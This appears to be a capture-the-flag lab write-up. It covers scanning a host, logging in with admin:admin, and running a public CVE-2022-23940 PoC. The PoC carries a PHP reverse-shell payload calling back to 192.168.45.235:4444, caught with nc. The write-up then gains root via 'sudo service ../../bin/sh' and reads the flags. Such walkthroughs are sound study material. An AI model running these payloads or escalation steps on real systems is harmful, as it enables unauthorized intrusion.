`Running all scans on 192.168.190.146`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`80/tcp   open  http`
`3306/tcp open  mysql`

Check out the web server

We have weak credentials admin:admin

![[Pasted image 20240210000352.png]]

Check out the PoC - https://github.com/manuelz120/CVE-2022-23940 (found on Google)

`─$ python -m pip install -r "requirements.txt"`              
`Collecting certifi==2021.10.8 (from -r requirements.txt (line 1))`
  `Downloading certifi-2021.10.8-py2.py3-none-any.whl (149 kB)`
     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 149.2/149.2 kB 2.3 MB/s eta 0:00:00`
`Collecting charset-normalizer==2.0.12 (from -r requirements.txt (line 2))`
  `Downloading charset_normalizer-2.0.12-py3-none-any.whl (39 kB)`
`Collecting click==8.0.4 (from -r requirements.txt (line 3))`
  `Downloading click-8.0.4-py3-none-any.whl (97 kB)`
     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 97.5/97.5 kB 2.4 MB/s eta 0:00:00`
`Collecting idna==3.3 (from -r requirements.txt (line 4))`
  `Downloading idna-3.3-py3-none-any.whl (61 kB)`
     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 61.2/61.2 kB 2.4 MB/s eta 0:00:00`
`Collecting requests==2.27.1 (from -r requirements.txt (line 5))`
  `Downloading requests-2.27.1-py2.py3-none-any.whl (63 kB)`
     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 63.1/63.1 kB 2.5 MB/s eta 0:00:00`
`Collecting urllib3==1.26.8 (from -r requirements.txt (line 6))`
  `Downloading urllib3-1.26.8-py2.py3-none-any.whl (138 kB)`
     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 138.7/138.7 kB 2.6 MB/s eta 0:00:00`
`Installing collected packages: certifi, urllib3, idna, click, charset-normalizer, requests`
  `Attempting uninstall: certifi`
    `Found existing installation: certifi 2023.11.17`
    `Uninstalling certifi-2023.11.17:`
      `Successfully uninstalled certifi-2023.11.17`
  `Attempting uninstall: urllib3`
    `Found existing installation: urllib3 2.1.0`
    `Uninstalling urllib3-2.1.0:`
      `Successfully uninstalled urllib3-2.1.0`
  `Attempting uninstall: idna`
    `Found existing installation: idna 3.6`
    `Uninstalling idna-3.6:`
      `Successfully uninstalled idna-3.6`
  `Attempting uninstall: click`
    `Found existing installation: click 8.1.7`
    `Uninstalling click-8.1.7:`
      `Successfully uninstalled click-8.1.7`
  `Attempting uninstall: charset-normalizer`
    `Found existing installation: charset-normalizer 3.3.2`
    `Uninstalling charset-normalizer-3.3.2:`
      `Successfully uninstalled charset-normalizer-3.3.2`
  `Attempting uninstall: requests`
    `Found existing installation: requests 2.31.0`
    `Uninstalling requests-2.31.0:`
      `Successfully uninstalled requests-2.31.0`
`ERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.`
`flask 3.0.1 requires click>=8.1.3, but you have click 8.0.4 which is incompatible.`
`Successfully installed certifi-2021.10.8 charset-normalizer-2.0.12 click-8.0.4 idna-3.3 requests-2.27.1 urllib3-1.26.8`

`[notice] A new release of pip is available: 23.3.2 -> 24.0`
`[notice] To update, run: pip install --upgrade pip`

On the Github page, it tells us the reverse shell to use:
`└─$ python exploit.py -h http://192.168.190.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.235\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

Catch and upgrade
`└─$ nc -nlvp 4444`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`
`Ncat: Connection from 192.168.190.146:49976.`
`/bin/sh: 0: can't access tty; job control turned off`
`$ python3 -c 'import pty; pty.spawn("/bin/bash")'` 
`www-data@crane:/var/www/html$`

Check sudo -l if we can

`sudo -l`
`Matching Defaults entries for www-data on localhost:`
    `env_reset, mail_badpass,`
    `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin`

`User www-data may run the following commands on localhost:`
    `(ALL) NOPASSWD: /usr/sbin/service`

Check GTFObins for sudo service

https://gtfobins.github.io/gtfobins/service/

It tells us to use this command
`sudo /usr/sbin/service ../../bin/sh`

This gives us root, get the flags

`cat proof.txt`
`1a98fb723ece8419f917f13d516e98c2`
`cd /home`
`ls`
`find / -name "local.txt" 2>/dev/null`
`/var/www/local.txt`
`cat /var/www/local.txt`
`3865dfae204ee9f66d9c8fbf4e953f1d`
